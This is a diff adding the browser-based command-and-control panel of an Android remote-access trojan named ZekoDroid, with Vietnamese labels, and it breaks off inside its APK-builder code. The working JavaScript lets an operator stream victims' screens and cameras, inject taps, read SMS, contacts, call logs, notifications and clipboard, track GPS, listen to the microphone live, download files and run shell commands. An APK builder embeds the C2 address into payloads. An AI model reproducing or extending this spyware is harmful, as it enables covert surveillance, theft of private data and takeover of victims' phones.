@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>ZekoDroid · C2</title>
+<style>
+  :root{
+    --bg:#050a14; --panel:#0d1a2e; --line:#17304d; --txt:#d6e6ff; --dim:#6e8bb0;
+    --cyan:#22d3ee; --blue:#3b82f6; --ok:#22e08a; --bad:#f87171;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:radial-gradient(1200px 600px at 15% -10%,#0b2440 0%,var(--bg) 55%);
+       color:var(--txt);font:13px/1.5 "Consolas",ui-monospace,monospace;min-height:100vh}
+  header{display:flex;align-items:center;gap:14px;padding:14px 20px;border-bottom:1px solid var(--line);
+         background:linear-gradient(90deg,#071426,#0b1e36 60%,#071426)}
+  .logo{font-size:22px;filter:drop-shadow(0 0 10px #22d3ee88)}
+  .brand{font-weight:700;font-size:16px;
+         background:linear-gradient(90deg,#7dd3fc,#22d3ee,#3b82f6);-webkit-background-clip:text;background-clip:text;color:transparent}
+  .sub{color:var(--dim);font-size:11px}
+  .grow{flex:1}
+  button{cursor:pointer;border:1px solid var(--line);background:#102340;color:var(--txt);
+         padding:6px 12px;border-radius:7px;font:inherit}
+  button:hover{border-color:var(--cyan);color:#fff}
+  button.primary{background:linear-gradient(180deg,#1d4ed8,#1e3a8a);border-color:#3b82f6}
+  input,select,textarea{background:#08172a;border:1px solid var(--line);color:var(--txt);
+         padding:7px 10px;border-radius:7px;font:inherit;width:100%}
+  input:focus,textarea:focus{outline:none;border-color:var(--cyan)}
+  .wrap{padding:18px 20px}
+  .card{background:linear-gradient(180deg,var(--panel),#0a1626);border:1px solid var(--line);
+        border-radius:12px;padding:14px}
+  table{width:100%;border-collapse:collapse}
+  th{text-align:left;color:var(--dim);font-weight:600;font-size:11px;text-transform:uppercase;
+     letter-spacing:.6px;padding:8px;border-bottom:1px solid var(--line)}
+  td{padding:8px;border-bottom:1px solid #10243a;vertical-align:middle}
+  tr.row:hover{background:#0e2038;cursor:pointer}
+  .dot{width:8px;height:8px;border-radius:50%;display:inline-block;margin-right:7px}
+  .on{background:var(--ok);box-shadow:0 0 8px var(--ok)}
+  .off{background:#39506e}
+  .pill{padding:2px 8px;border-radius:99px;font-size:11px;border:1px solid var(--line);color:var(--dim)}
+  .grid{display:grid;grid-template-columns:320px 1fr;gap:16px;align-items:start}
+  .tabs{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px}
+  .tab{padding:6px 11px;border-radius:8px;border:1px solid var(--line);color:var(--dim);cursor:pointer;font-size:12px}
+  .tab.active{color:#031018;background:linear-gradient(180deg,#7dd3fc,#22d3ee);border-color:#22d3ee;font-weight:700}
+  .viewer{background:#02060d;border:1px solid var(--line);border-radius:10px;overflow:hidden;
+          display:flex;align-items:center;justify-content:center;min-height:260px}
+  .viewer img{max-width:100%;display:block}
+  pre{background:#02060d;border:1px solid var(--line);border-radius:10px;padding:12px;
+      overflow:auto;max-height:420px;margin:0;white-space:pre-wrap;word-break:break-word}
+  .dim{color:var(--dim)}
+  .kv{display:grid;grid-template-columns:120px 1fr;gap:6px 10px}
+  .kv b{color:var(--dim);font-weight:500}
+  #login{max-width:360px;margin:12vh auto;display:flex;flex-direction:column;gap:10px}
+  .err{color:var(--bad);min-height:18px;font-size:12px}
+  .flex{display:flex;gap:8px;align-items:center}
+  .sp{height:10px}
+  .scrolly{max-height:360px;overflow:auto}
+  .bubble{background:#0b1d33;border:1px solid var(--line);border-radius:10px;padding:8px 10px;margin-bottom:8px}
+  .bubble .m{color:#9fb6d4;white-space:pre-wrap}
+  .bubble .h{color:#7dd3fc;font-size:11px}
+</style>
+</head>
+<body>
+
+<header>
+  <span class="logo">🐋</span>
+  <div>
+    <div class="brand">ZekoDroid</div>
+    <div class="sub">android C2 · browser panel</div>
+  </div>
+  <div class="grow"></div>
+  <button id="openAdmin" style="display:none">⚙ Quản trị</button>
+  <button id="openBuilder">🐋 Builder</button>
+  <span class="dim" id="who"></span>
+  <button id="logout" style="display:none">Đăng xuất</button>
+</header>
+
+<div id="loginBox" class="wrap">
+  <div id="login" class="card">
+    <h1 style="margin:0 0 4px;font-size:20px">🐋 Đăng nhập C2</h1>
+    <div class="sub">panel trên VPS · vào bằng IP:port</div>
+    <div class="sp"></div>
+    <input id="u" placeholder="user" autocomplete="username" />
+    <input id="p" placeholder="password" type="password" autocomplete="current-password" />
+    <button class="primary" id="doLogin">Vào panel</button>
+    <div class="err" id="loginErr"></div>
+  </div>
+</div>
+
+<div id="main" class="wrap" style="display:none">
+  <div class="grid">
+    <div class="card">
+      <div class="flex" style="margin-bottom:10px">
+        <b>Thiết bị</b><span class="pill" id="count">0</span>
+        <div class="grow"></div><button id="refresh">↻</button>
+      </div>
+      <div class="scrolly">
+        <table><thead><tr><th>Model</th><th>Android</th></tr></thead><tbody id="agents"></tbody></table>
+      </div>
+    </div>
+    <div class="card" id="detail"><div class="dim">Chọn 1 thiết bị bên trái…</div></div>
+  </div>
+</div>
+
+<div id="builderWrap" class="wrap" style="display:none">
+  <div class="card" style="max-width:640px">
+    <div class="flex" style="margin-bottom:12px">
+      <b>🐋 Build APK</b><div class="grow"></div>
+      <button id="bClose">← quay lại</button>
+    </div>
+    <div class="dim" style="margin-bottom:12px">
+      Nhập IP VPS — server tự thay <b>assets/zk.conf</b> rồi ký v2, không cần Android SDK.
+    </div>
+    <div class="kv" style="grid-template-columns:110px 1fr">
+      <b>host</b><input id="bHost" placeholder="1.2.3.4 hoặc domain" />
+      <b>port</b><input id="bPort" value="7878" />
+      <b>psk</b><input id="bPsk" placeholder="(để trống nếu không mã hoá)" />
+      <b>icon</b><input id="bIcon" type="file" accept="image/png" />
+    </div>
+    <div class="sp"></div>
+    <button class="primary" id="bBuild">⬇ Build &amp; tải APK</button>
+    <div class="sp"></div>
+    <pre id="bOut" class="dim">…</pre>
+  </div>
+</div>
+<div id="adminWrap" class="wrap" style="display:none">
+  <div class="card">
+    <div class="flex" style="margin-bottom:12px">
+      <b>⚙ Quản trị</b>
+      <div class="tabs" style="margin:0 0 0 14px">
+        <div class="tab active" data-adm="users">Users</div>
+        <div class="tab" data-adm="sessions">Sessions</div>
+        <div class="tab" data-adm="logs">Logs</div>
+      </div>
+      <div class="grow"></div>
+      <button id="aClose">← quay lại</button>
+    </div>
+    <div id="admBody"></div>
+  </div>
+</div>
+<script>
+const $ = s => document.querySelector(s);
+const esc = s => String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const api = async (u,o={}) => {
+  const r = await fetch(u,{credentials:'same-origin',...o});
+  if (r.status===401){showLogin();throw new Error('401');}
+  const t = await r.text();
+  try{return JSON.parse(t);}catch{return {raw:t};}
+};
+const post = (u,b)=>api(u,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(b)});
+const cmd = (id,c,data={},timeout=25)=>post(`/api/agents/${id}/cmd`,{cmd:c,data,timeout});
+
+function showLogin(){$('#loginBox').style.display='';$('#main').style.display='none';$('#logout').style.display='none';}
+function showMain(){$('#loginBox').style.display='none';$('#main').style.display='';$('#logout').style.display='';}
+
+$('#doLogin').onclick = async () => {
+  $('#loginErr').textContent='';
+  const r = await post('/api/login',{user:$('#u').value.trim(),pass:$('#p').value});
+  if (r.error){$('#loginErr').textContent=r.error;return;}
+  showMain();loadAgents(); if (window.__zkRefreshMe) window.__zkRefreshMe();
+};
+$('#p').addEventListener('keydown',e=>{if(e.key==='Enter')$('#doLogin').click();});
+$('#logout').onclick = async()=>{await post('/api/logout',{});showLogin();};
+$('#refresh').onclick = ()=>loadAgents();
+
+let agents=[], current=null, tab='info';
+
+async function loadAgents(){
+  try{ agents = await api('/api/agents'); if(!Array.isArray(agents)) agents=[]; }catch{ agents=[]; }
+  const tb=$('#agents'); tb.innerHTML='';
+  $('#count').textContent = agents.filter(a=>a.online).length+'/'+agents.length;
+  for(const a of agents){
+    const tr=document.createElement('tr'); tr.className='row';
+    tr.innerHTML=`<td><span class="dot ${a.online?'on':'off'}"></span><b>${esc(a.host||'?')}</b></td>
+                  <td class="dim">${esc((a.os||'').replace('Android ','').slice(0,22))}</td>`;
+    tr.onclick=()=>{current=a.hwid;tab='info';render();};
+    tb.appendChild(tr);
+  }
+  if(current){
+    const still = agents.find(a=>a.hwid===current);
+    if(!still){ $('#detail').innerHTML='<div class="dim">Thiết bị đã offline.</div>'; }
+  }
+}
+
+function render(){
+  const a = agents.find(x=>x.hwid===current); if(!a) return;
+  const d=$('#detail');
+  d.innerHTML=`
+    <div class="flex" style="margin-bottom:10px">
+      <span class="dot ${a.online?'on':'off'}"></span><b>${esc(a.host)}</b>
+      <span class="pill">${esc(a.ip)}</span>
+      <span class="pill">${a.online?'online':'offline'}</span>
+      <div class="grow"></div><span class="dim" style="font-size:11px">${esc(a.hwid)}</span>
+    </div>
+    <div class="tabs">${['info','live','screen','cam','sms','contacts','calllog','notifs','location','files','shell','apps','mic']
+      .map(t=>`<div class="tab ${tab===t?'active':''}" data-tab="${t}">${label(t)}</div>`).join('')}</div>
+    <div id="view"></div>`;
+  d.querySelectorAll('.tab').forEach(el=>el.onclick=()=>{tab=el.dataset.tab;render();});
+  ({info:viewInfo,live:viewLive,screen:viewScreen,cam:viewCam,sms:viewSms,contacts:viewContacts,calllog:viewCalls,notifs:viewNotifs,
+    location:viewLoc,files:viewFiles,shell:viewShell,apps:viewApps,mic:viewMic})[tab]($('#view'),a);
+}
+const label = t => ({info:'Info',live:'Live',screen:'Màn hình',cam:'Camera',sms:'SMS',contacts:'Danh bạ',
+  calllog:'Call log',notifs:'Thông báo',location:'Vị trí',files:'Files',shell:'Shell',apps:'Apps',mic:'Mic'})[t];
+
+async function viewInfo(v,a){
+  v.innerHTML=`<div class="kv">
+    <b>model</b><span>${esc(a.host)}</span><b>hãng</b><span>${esc(a.user)}</span>
+    <b>android</b><span>${esc(a.os)}</span><b>ip</b><span>${esc(a.ip)}</span>
+    <b>cpu</b><span>${esc(a.cpu)}</span><b>pin</b><span>${esc(a.ram)}</span>
+    <b>last seen</b><span>${esc(a.lastSeen)}</span></div>
+    <div class="sp"></div><div class="flex"><button id="btn">↻ Tải chi tiết</button><button id="insp">🌳 Inspector</button><button id="perm">🔐 Quyền</button></div><pre id="out" class="dim" style="margin-top:10px">…</pre>`;
+  $('#btn').onclick=async()=>{ const r=await cmd(a.hwid,'info'); $('#out').textContent=JSON.stringify(r,null,2); };
+}
+
+function viewScreen(v,a){
+  v.innerHTML=`<div class="flex" style="margin-bottom:8px"><span class="dim">MediaProjection · cần bật chia sẻ màn hình trên máy</span>
+    <div class="grow"></div><button id="r">↻</button></div>
+    <div class="viewer"><img id="img" style="cursor:crosshair" src="/api/agents/${a.hwid}/screen.mjpg?t=${Date.now()}"></div>
+    <div class="flex" style="margin-top:8px"><span class="dim">bấm vào ảnh để tap lên máy · kéo = swipe</span>
+      <div class="grow"></div><span class="dim" id="tapOut"></span></div>`;
+  $('#r').onclick=()=>{$('#img').src=`/api/agents/${a.hwid}/screen.mjpg?t=${Date.now()}`;};
+
+  const img = $('#img');
+  let down = null;
+  const toDevice = ev => {
+    const r = img.getBoundingClientRect();
+    const sx = img.naturalWidth / r.width, sy = img.naturalHeight / r.height;
+    return { x: Math.round((ev.clientX - r.left) * sx), y: Math.round((ev.clientY - r.top) * sy) };
+  };
+  img.onmousedown = ev => { down = toDevice(ev); };
+  img.onmouseup = async ev => {
+    if (!down) return;
+    const up = toDevice(ev);
+    const dx = Math.abs(up.x - down.x), dy = Math.abs(up.y - down.y);
+    let r;
+    if (dx > 12 || dy > 12) r = await cmd(a.hwid,'swipe',{x1:down.x,y1:down.y,x2:up.x,y2:up.y,ms:250});
+    else r = await cmd(a.hwid,'tap',{x:up.x,y:up.y});
+    $('#tapOut').textContent = (r.ok ? '✓ ' : '✗ ') + (dx>12||dy>12 ? `swipe ${down.x},${down.y}→${up.x},${up.y}` : `tap ${up.x},${up.y}`)
+      + (r.error ? ' · ' + r.error : '');
+    down = null;
+  };
+}
+
+function viewCam(v,a){
+  v.innerHTML=`<div class="flex" style="margin-bottom:8px">
+      <button id="front">Camera trước</button><button id="back">Camera sau</button><button id="snap">Chụp 1 tấm</button></div>
+    <div class="viewer"><img id="img" src="/api/agents/${a.hwid}/cam.mjpg?t=${Date.now()}"></div>`;
+  const set=f=>{$('#img').src=`/api/agents/${a.hwid}/cam.mjpg?facing=${f}&t=${Date.now()}`;};
+  $('#front').onclick=()=>set(1); $('#back').onclick=()=>set(0);
+  $('#snap').onclick=async()=>{ const r=await cmd(a.hwid,'cam_shot',{quality:75},30);
+    if(r.jpeg){$('#img').src='data:image/jpeg;base64,'+r.jpeg;} };
+}
+
+async function viewSms(v,a){
+  v.innerHTML=`<div class="flex" style="margin-bottom:8px"><button id="ld" class="primary">↻ Tải SMS</button>
+    <div class="grow"></div><span class="dim" id="n"></span></div>
+    <div class="scrolly" id="list"><div class="dim">chưa tải…</div></div>`;
+  $('#ld').onclick=async()=>{
+    $('#list').innerHTML='<div class="dim">đang đọc…</div>';
+    const r=await cmd(a.hwid,'sms',{limit:120},40);
+    if(r.error){$('#list').innerHTML=`<div class="err">${esc(r.error)}</div>`;return;}
+    const arr=r.sms||[]; $('#n').textContent=arr.length+' tin';
+    $('#list').innerHTML=arr.map(m=>`<div class="bubble"><div class="h">${esc(m.from)} · ${esc(m.date)} · ${esc(m.type)}</div>
+      <div class="m">${esc(m.body)}</div></div>`).join('') || '<div class="dim">hộp thư rỗng</div>';
+  };
+}
+
+async function viewContacts(v,a){
+  v.innerHTML=`<div class="flex" style="margin-bottom:8px"><button id="ld" class="primary">↻ Tải danh bạ</button>
+    <div class="grow"></div><span class="dim" id="n"></span></div>
+    <div class="scrolly"><table><thead><tr><th>Tên</th><th>SĐT</th></tr></thead><tbody id="tb"></tbody></table></div>`;
+  $('#ld').onclick=async()=>{
+    const r=await cmd(a.hwid,'contacts',{limit:300},40);
+    const arr=r.contacts||[]; $('#n').textContent=arr.length+' liên hệ';
+    $('#tb').innerHTML=arr.map(c=>`<tr><td>${esc(c.name)}</td><td class="dim">${esc(c.phone)}</td></tr>`).join('')
+      || `<tr><td colspan="2" class="dim">${esc(r.error||'trống')}</td></tr>`;
+  };
+}
+
+async function viewCalls(v,a){
+  v.innerHTML=`<div class="flex" style="margin-bottom:8px"><button id="ld" class="primary">↻ Tải call log</button>
+    <div class="grow"></div><span class="dim" id="n"></span></div>
+    <div class="scrolly"><table><thead><tr><th>Loại</th><th>SĐT</th><th>Lúc</th><th>Giây</th></tr></thead><tbody id="tb"></tbody></table></div>`;
+  $('#ld').onclick=async()=>{
+    const r=await cmd(a.hwid,'calllog',{limit:150},40);
+    const arr=r.calls||[]; $('#n').textContent=arr.length+' cuộc';
+    $('#tb').innerHTML=arr.map(c=>`<tr><td>${c.type==='in'?'📥':c.type==='out'?'📤':'❌'} ${esc(c.type)}</td>
+      <td>${esc(c.number)}</td><td class="dim">${esc(c.date)}</td><td class="dim">${esc(c.duration)}</td></tr>`).join('')
+      || `<tr><td colspan="4" class="dim">${esc(r.error||'trống')}</td></tr>`;
+  };
+}
+
+async function viewNotifs(v,a){
+  v.innerHTML=`<div class="flex" style="margin-bottom:8px"><button id="ld" class="primary">↻ Tải thông báo</button>
+    <div class="grow"></div><span class="dim" id="n"></span></div>
+    <div class="scrolly" id="list"><div class="dim">chưa tải…</div></div>`;
+  $('#ld').onclick=async()=>{
+    const r=await cmd(a.hwid,'notifs',{limit:120},30);
+    const arr=r.items||[]; $('#n').textContent=arr.length+' thông báo'+(r.enabled?'':' · CHƯA CẤP QUYỀN');
+    $('#list').innerHTML=arr.map(m=>`<div class="bubble"><div class="h">${esc(m.app)} · ${esc(m.time)}</div>
+      <div class="m"><b>${esc(m.title)}</b>\n${esc(m.text)}</div></div>`).join('')
+      || `<div class="dim">${esc(r.enabled?'trống':'bật Notification access trên máy')}</div>`;
+  };
+}
+async function viewLoc(v,a){
+  v.innerHTML=`<button id="ld" class="primary">↻ Lấy vị trí</button><pre id="out" class="dim" style="margin-top:10px">…</pre>`;
+  $('#ld').onclick=async()=>{
+    const r=await cmd(a.hwid,'location',{},30);
+    if(r.lat) $('#out').innerHTML=`<a href="${r.map}" target="_blank" style="color:#22d3ee">${r.lat}, ${r.lon}</a>\nacc ${r.acc}m · ${esc(r.time)}`;
+    else $('#out').textContent=JSON.stringify(r,null,2);
+  };
+}
+
+async function viewFiles(v,a){
+  v.innerHTML=`<div class="flex" style="margin-bottom:8px">
+      <input id="path" value="/sdcard" style="max-width:420px"><button id="go">Mở</button></div>
+    <div class="scrolly"><table><thead><tr><th>Tên</th><th>Size</th><th>Sửa</th><th></th></tr></thead><tbody id="tb"></tbody></table></div>
+    <pre id="out" class="dim" style="margin-top:8px"></pre>`;
+  const load=async p=>{
+    $('#path').value=p;
+    const r=await cmd(a.hwid,'ls',{path:p},30);
+    const tb=$('#tb'); tb.innerHTML='';
+    if(r.error){$('#out').textContent=r.error;return;}
+    $('#out').textContent='';
+    for(const e of (r.entries||[])){
+      const tr=document.createElement('tr');
+      tr.innerHTML=`<td>${e.dir?'📁':'📄'} ${esc(e.name)}</td><td class="dim">${e.dir?'':kb(e.size)}</td>
+        <td class="dim">${esc(e.modified||'')}</td>
+        <td>${e.dir?'':`<button data-dl="${esc(e.path)}">↓</button>`}</td>`;
+      if(e.dir) tr.onclick=ev=>{ if(ev.target.tagName!=='BUTTON') load(e.path); };
+      tb.appendChild(tr);
+    }
+    tb.querySelectorAll('[data-dl]').forEach(b=>b.onclick=async()=>{
+      $('#out').textContent='đang tải…';
+      const r2=await cmd(a.hwid,'download',{path:b.dataset.dl},60);
+      if(!r2.b64){$('#out').textContent=r2.error||'lỗi';return;}
+      const bin=atob(r2.b64), u8=new Uint8Array(bin.length);
+      for(let i=0;i<bin.length;i++) u8[i]=bin.charCodeAt(i);
+      const url=URL.createObjectURL(new Blob([u8]));
+      const link=document.createElement('a'); link.href=url; link.download=b.dataset.dl.split('/').pop(); link.click();
+      URL.revokeObjectURL(url); $('#out').textContent='đã tải '+kb(u8.length);
+    });
+  };
+  $('#go').onclick=()=>load($('#path').value);
+  load('/sdcard');
+}
+const kb=n=>n>1048576?(n/1048576).toFixed(1)+' MB':n>1024?(n/1024).toFixed(0)+' KB':n+' B';
+
+function viewShell(v,a){
+  v.innerHTML=`<div class="flex" style="margin-bottom:8px"><input id="c" placeholder="id && getprop ro.product.model">
+    <button class="primary" id="run">Chạy</button></div><pre id="out" class="dim">…</pre>`;
+  const run=async()=>{
+    const c=$('#c').value.trim(); if(!c)return;
+    $('#out').textContent='$ '+c+'\n\nđang chạy…';
+    const r=await cmd(a.hwid,'shell',{cmd:c},45);
+    $('#out').textContent='$ '+c+'\n\n'+(r.out||'')+(r.err?'\n[stderr]\n'+r.err:'');
+  };
+  $('#run').onclick=run;
+  $('#c').addEventListener('keydown',e=>{if(e.key==='Enter')run();});
+}
+
+async function viewApps(v,a){
+  v.innerHTML=`<div class="flex" style="margin-bottom:8px"><button id="ld" class="primary">↻ Danh sách app</button>
+    <div class="grow"></div><span class="dim" id="n"></span></div>
+    <div class="scrolly"><table><thead><tr><th>App</th><th>Package</th><th></th></tr></thead><tbody id="tb"></tbody></table></div>`;
+  $('#ld').onclick=async()=>{
+    const r=await cmd(a.hwid,'apps',{},40);
+    const arr=r.apps||[]; $('#n').textContent=arr.length+' app';
+    $('#tb').innerHTML=arr.map(x=>`<tr><td>${esc(x.name)}</td><td class="dim">${esc(x.pkg)}</td>
+      <td class="dim">${x.system?'hệ thống':''}</td></tr>`).join('')||`<tr><td colspan="3" class="dim">${esc(r.error||'trống')}</td></tr>`;
+  };
+}
+
+function viewMic(v,a){
+  v.innerHTML=`<div class="flex" style="margin-bottom:8px">
+      <input id="sec" value="5" style="max-width:90px"><button class="primary" id="rec">● Ghi âm</button></div>
+    <div id="out" class="dim">chưa ghi…</div>`;
+  $('#rec').onclick=async()=>{
+    const s=Math.max(1,Math.min(60,parseInt($('#sec').value||'5')));
+    $('#out').textContent='đang ghi '+s+'s…';
+    const r=await cmd(a.hwid,'mic',{seconds:s},s*1000+15000);
+    if(!r.b64){$('#out').textContent=r.error||'lỗi';return;}
+    const bin=atob(r.b64), u8=new Uint8Array(bin.length);
+    for(let i=0;i<bin.length;i++) u8[i]=bin.charCodeAt(i);
+    const url=URL.createObjectURL(new Blob([u8],{type:r.mime||'audio/mp4'}));
+    $('#out').innerHTML=`<audio controls src="${url}" style="width:100%"></audio>`;
+  };
+}
+
+(async()=>{
+  try{const me=await api('/api/me'); if(me.ok){showMain();$('#who').textContent=me.user;loadAgents();} else showLogin();}
+  catch{showLogin();}
+  setInterval(()=>{ if($('#main').style.display!=='none') loadAgents(); },5000);
+})();
+</script>
+<script>
+/* zk-stream-patch: realtime push stream + HVNC control */
+let _stream = null;
+async function _stopStream() {
+  if (!_stream) return;
+  const st = _stream; _stream = null;
+  try { await cmd(st.hwid, 'stream_stop', { kind: st.kind }); } catch (e) {}
+}
+
+const _render0 = render;
+render = function () {
+  if (tab !== 'screen' && tab !== 'cam') _stopStream();
+  _render0();
+};
+
+viewScreen = function (v, a) {
+  _stopStream();
+  v.innerHTML = `<div class="flex" style="margin-bottom:8px">
+      <button id="st" class="primary">▶ Bật stream</button><button id="sp">■ Dừng</button>
+      <span class="dim">q</span><select id="q" style="max-width:80px"><option>40</option><option selected>55</option><option>70</option></select>
+      <span class="dim">fps</span><select id="f" style="max-width:80px"><option>5</option><option selected>8</option><option>15</option><option>20</option></select>
+      <div class="grow"></div><span class="dim" id="tapOut"></span></div>
+    <div class="viewer"><img id="img" style="cursor:crosshair"></div>
+    <div class="dim" style="margin-top:6px">bấm vào ảnh = tap lên máy · kéo = swipe</div>`;
+
+  const start = async () => {
+    const fps = +$('#q') ? 0 : 0; // noop
+    const f = +document.querySelector('#f').value, q = +document.querySelector('#q').value;
+    const r = await cmd(a.hwid, 'stream_start', { kind: 'screen', fps: f, quality: q });
+    if (r.msg && !r.ok) { document.querySelector('#tapOut').textContent = r.msg; }
+    _stream = { hwid: a.hwid, kind: 'screen' };
+    document.querySelector('#img').src = `/api/agents/${a.hwid}/screen.mjpg?q=${q}&fps=${f}&t=${Date.now()}`;
+  };
+  document.querySelector('#st').onclick = start;
+  document.querySelector('#sp').onclick = async () => { await _stopStream(); document.querySelector('#img').removeAttribute('src'); };
+
+  const img = document.querySelector('#img');
+  let down = null;
+  const toDevice = ev => {
+    const r = img.getBoundingClientRect();
+    const sx = img.naturalWidth / r.width, sy = img.naturalHeight / r.height;
+    return { x: Math.round((ev.clientX - r.left) * sx), y: Math.round((ev.clientY - r.top) * sy) };
+  };
+  img.onmousedown = ev => { down = toDevice(ev); };
+  img.onmouseup = async ev => {
+    if (!down) return;
+    const up = toDevice(ev);
+    const dx = Math.abs(up.x - down.x), dy = Math.abs(up.y - down.y);
+    let r;
+    if (dx > 12 || dy > 12) r = await cmd(a.hwid, 'swipe', { x1: down.x, y1: down.y, x2: up.x, y2: up.y, ms: 250 });
+    else r = await cmd(a.hwid, 'tap', { x: up.x, y: up.y });
+    document.querySelector('#tapOut').textContent = (r.ok ? '✓ ' : '✗ ')
+      + (dx > 12 || dy > 12 ? `swipe ${down.x},${down.y}→${up.x},${up.y}` : `tap ${up.x},${up.y}`)
+      + (r.error ? ' · ' + r.error : '');
+    down = null;
+  };
+  start();
+};
+
+viewCam = function (v, a) {
+  _stopStream();
+  v.innerHTML = `<div class="flex" style="margin-bottom:8px">
+      <button id="back" class="primary">Camera sau</button><button id="front">Camera trước</button><button id="sp">■ Dừng</button>
+      <span class="dim">q</span><select id="q" style="max-width:80px"><option>40</option><option selected>60</option><option>75</option></select>
+      <span class="dim">fps</span><select id="f" style="max-width:80px"><option>8</option><option selected>12</option><option>20</option><option>30</option></select>
+      <div class="grow"></div><span class="dim" id="msg"></span></div>
+    <div class="viewer"><img id="img"></div>`;
+
+  const start = async (facing) => {
+    await _stopStream();
+    const f = +document.querySelector('#f').value, q = +document.querySelector('#q').value;
+    const r = await cmd(a.hwid, 'stream_start', { kind: 'cam', fps: f, quality: q, facing });
+    if (r.msg && !r.ok) document.querySelector('#msg').textContent = r.msg;
+    _stream = { hwid: a.hwid, kind: 'cam' };
+    document.querySelector('#img').src = `/api/agents/${a.hwid}/cam.mjpg?facing=${facing}&q=${q}&fps=${f}&t=${Date.now()}`;
+  };
+  document.querySelector('#back').onclick = () => start(0);
+  document.querySelector('#front').onclick = () => start(1);
+  document.querySelector('#sp').onclick = async () => { await _stopStream(); document.querySelector('#img').removeAttribute('src'); };
+  start(0);
+};
+</script>
+<script>
+/* zk-live-patch: mic realtime (PCM16 -> WebAudio) + feed event realtime */
+let _ac = null, _nextT = 0, _liveTimer = null, _liveSeq = 0, _audioN = 0;
+
+function _playPcm(b64, rate) {
+  try {
+    if (!_ac) _ac = new (window.AudioContext || window.webkitAudioContext)();
+    const bin = atob(b64), len = bin.length | 0;
+    const i16 = new Int16Array(len >> 1);
+    for (let i = 0; i < i16.length; i++) {
+      let v = (bin.charCodeAt(2 * i) | (bin.charCodeAt(2 * i + 1) << 8));
+      if (v >= 32768) v -= 65536;
+      i16[i] = v;
+    }
+    const buf = _ac.createBuffer(1, i16.length, rate || 16000);
+    const f = new Float32Array(i16.length);
+    for (let i = 0; i < i16.length; i++) f[i] = i16[i] / 32768;
+    buf.copyToChannel(f, 0);
+    const src = _ac.createBufferSource();
+    src.buffer = buf;
+    src.connect(_ac.destination);
+    const now = _ac.currentTime;
+    if (_nextT < now + 0.05) _nextT = now + 0.05;
+    src.start(_nextT);
+    _nextT += buf.duration;
+    _audioN++;
+  } catch (e) { }
+}
+
+function _feed(html) {
+  const el = document.querySelector('#feed');
+  if (!el) return;
+  const d = document.createElement('div');
+  d.className = 'bubble';
+  d.innerHTML = html;
+  el.prepend(d);
+  while (el.children.length > 60) el.removeChild(el.lastChild);
+}
+
+async function _pollLive(a) {
+  try {
+    const r = await api(`/api/agents/${a.hwid}/events?since=${_liveSeq}`);
+    if (!r || !r.items) return;
+    _liveSeq = r.seq || _liveSeq;
+    const st = document.querySelector('#lstate');
+    for (const it of r.items) {
+      const d = it.data || {};
+      if (it.type === 'audio') { _playPcm(d.pcm, d.rate); continue; }
+      if (it.type === 'location') _feed(`<div class="h">📍 ${it.ts} · ${d.lat}, ${d.lon} (±${Math.round(d.acc || 0)}m)</div>`);
+      else if (it.type === 'sms') _feed(`<div class="h">✉️ ${it.ts} · ${esc(d.from)}</div><div class="m">${esc(d.body)}</div>`);
+      else if (it.type === 'clipboard') _feed(`<div class="h">📋 ${it.ts}</div><div class="m">${esc(d.text)}</div>`);
+      else if (it.type === 'screen_state') _feed(`<div class="h">📱 ${it.ts} · màn hình ${esc(d.state)}</div>`);
+      else if (it.type === 'notif') _feed(`<div class="h">🔔 ${it.ts} · ${esc(d.app || '')}</div><div class="m">${esc(d.title || '')} ${esc(d.text || '')}</div>`);
+    }
+    if (st) st.textContent = 'audio chunk: ' + _audioN + ' · seq ' + _liveSeq;
+  } catch (e) { }
+}
+
+function viewLive(v, a) {
+  v.innerHTML = `<div class="flex" style="margin-bottom:8px;flex-wrap:wrap">
+      <button id="micOn" class="primary">▶ Nghe mic</button><button id="micOff">■ Dừng mic</button>
+      <span class="dim">rate</span><select id="rate" style="max-width:95px"><option>8000</option><option selected>16000</option></select>
+      <button id="locOn">📍 GPS realtime</button><button id="clipOn">📋 Clipboard</button>
+      <div class="grow"></div><span class="dim" id="lstate"></span></div>
+    <div class="dim" style="margin-bottom:6px">event realtime (SMS mới, vị trí, clipboard, bật/tắt màn hình)</div>
+    <div class="scrolly" id="feed"><div class="dim">chưa có event…</div></div>`;
+
+  document.querySelector('#micOn').onclick = async () => {
+    const rate = +document.querySelector('#rate').value;
+    const r = await cmd(a.hwid, 'mic_live', { on: true, rate }, 20);
+    if (r.msg && !r.ok) _feed(`<div class="h">mic: ${esc(r.msg)}</div>`);
+    if (_ac && _ac.state === 'suspended') _ac.resume();
+  };
+  document.querySelector('#micOff').onclick = async () => { await cmd(a.hwid, 'mic_live', { on: false }); };
+  document.querySelector('#locOn').onclick = async () => {
+    const r = await cmd(a.hwid, 'loc_live', { on: true, seconds: 10 }, 20);
+    _feed(`<div class="h">${r.ok ? '📍 bật theo dõi GPS (10s/lần)' : 'loi'}</div>`);
+  };
+  document.querySelector('#clipOn').onclick = async () => {
+    await cmd(a.hwid, 'clip_live', { on: true }, 20);
+    _feed(`<div class="h">📋 theo dõi clipboard</div>`);
+  };
+
+  if (_liveTimer) clearInterval(_liveTimer);
+  _pollLive(a);
+  _liveTimer = setInterval(() => _pollLive(a), 1200);
+}
+
+const _render1 = render;
+render = function () {
+  if (tab !== 'live') {
+    if (_liveTimer) { clearInterval(_liveTimer); _liveTimer = null; }
+    if (current) { cmd(current, 'mic_live', { on: false }).catch(() => {}); }
+  }
+  _render1();
+};
+</script>
+<script>
+/* zk-builder */
+(function () {
+  const w = document.querySelector('#builderWrap');
+  const main = document.querySelector('#main');
+  const login = document.querySelector('#loginBox');
+
+  document.querySelector('#openBuilder').onclick = () => {
+    login.style.display = 'none';
+    main.style.display = 'none';
+    w.style.display = '';
+    const h = document.querySelector('#bHost');
+    if (!h.value) h.value = location.hostname;
+    builderInfo();
+  };
+  document.querySelector('#bClose').onclick = () => {
+    w.style.display = 'none';
+    main.style.display = '';
+  };
+
+  async function builderInfo() {
+    try {
+      const r = await api('/api/builder/info');
+      if (!r.ready) document.querySelector('#bOut').textContent = 'CHƯA CÓ BASE APK trên server:\n' + (r.basePath || '');
